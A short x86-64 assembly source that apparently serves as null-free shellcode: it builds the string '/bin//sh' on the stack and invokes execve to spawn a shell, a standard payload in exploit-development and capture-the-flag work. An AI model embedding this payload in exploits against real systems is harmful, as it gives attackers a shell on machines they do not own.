section .text
global _start
_start:
    push    59 ; SYS_EXECVE
    pop     rax
    cdq            ; edx = 0 
    push    rdx    ; NULL
    pop     rsi    ; rsi = NULL
    mov     rcx, '/bin//sh'
    push    rdx    ; 0
    push    rcx    ; "/bin//sh"
    push    rsp
    pop     rdi    ; rdi="/bin//sh",0
    syscall